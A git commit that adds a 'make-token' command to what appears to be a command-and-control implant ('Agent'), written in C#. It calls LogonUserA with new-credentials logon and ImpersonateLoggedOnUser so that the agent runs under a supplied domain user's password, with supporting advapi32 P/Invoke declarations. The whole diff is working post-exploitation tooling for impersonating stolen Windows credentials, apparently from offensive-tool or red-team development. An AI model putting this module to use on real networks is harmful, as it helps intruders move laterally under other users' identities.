a18888a2c8a0343eba7f1dc7e31f62c5fb91cb6d
Elias Malik <eliasrmalik@gmail.com>
2021-11-25 07:34:03 -0800

    maketoken function

---
+++ Agent/Commands/MakeToken.cs
@@ -0,0 +1,48 @@
+﻿using Agent.Models;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Security.Principal;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Agent.Commands
+{
+    internal class MakeToken : AgentCommand
+    {
+        public override string Name => "make-token";
+
+        public override string Execute(AgentTask task)
+        {
+
+            // make-token DOMAIN\Username Password
+
+            var userDomain = task.Arguments[0];
+            var password = task.Arguments[1];
+
+            var split = userDomain.Split('\\');
+            var domain = split[0];
+            var username = split[1];
+
+            IntPtr hToken = IntPtr.Zero;
+            if (Native.Advapi.LogonUserA(username, domain, password, Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS,
+                Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
+
+            {
+
+                if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
+                {
+                    var identity = new WindowsIdentity(hToken);
+                    return $"Successfully impersonated {identity.Name}";
+                
+                }
+
+                return $"Successfully made token, but failed to impersonate";
+            
+            }
+
+            return "Failed to make token";
+
+        }
+    }
+}
---
+++ Agent/Native/Advapi.cs
@@ -0,0 +1,52 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Agent.Native
+{
+    public static class Advapi
+    {
+
+        [DllImport("advapi32.dll")]
+        public static extern bool LogonUserA(
+        string lpszUsername,
+        string lpszDomain,
+        string lpszPassword,
+        LogonProvider dwLogonType,
+        LogonUserProvider dwLogonProvider,
+        ref IntPtr phToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+
+        public enum LogonProvider
+        {
+            /// <summary>
+            /// https://github.com/dahall/Vanara/
+            /// </summary>
+
+            LOGON32_LOGON_INTERACTIVE = 2,
+			LOGON32_LOGON_NETWORK = 3,
+			LOGON32_LOGON_BATCH = 4,
+			LOGON32_LOGON_SERVICE = 5,
+			LOGON32_LOGON_UNLOCK = 7,
+			LOGON32_LOGON_NETWORK_CLEARTEXT = 8,
+			LOGON32_LOGON_NEW_CREDENTIALS = 9
+		}
+
+		public enum LogonUserProvider
+		{
+
+			LOGON32_PROVIDER_DEFAULT = 0,
+			LOGON32_PROVIDER_WINNT35 = 1,
+			LOGON32_PROVIDER_WINNT40 = 2,
+			LOGON32_PROVIDER_WINNT50 = 3,
+			LOGON32_PROVIDER_VIRTUAL = 4
+		}
+
+	}
+}
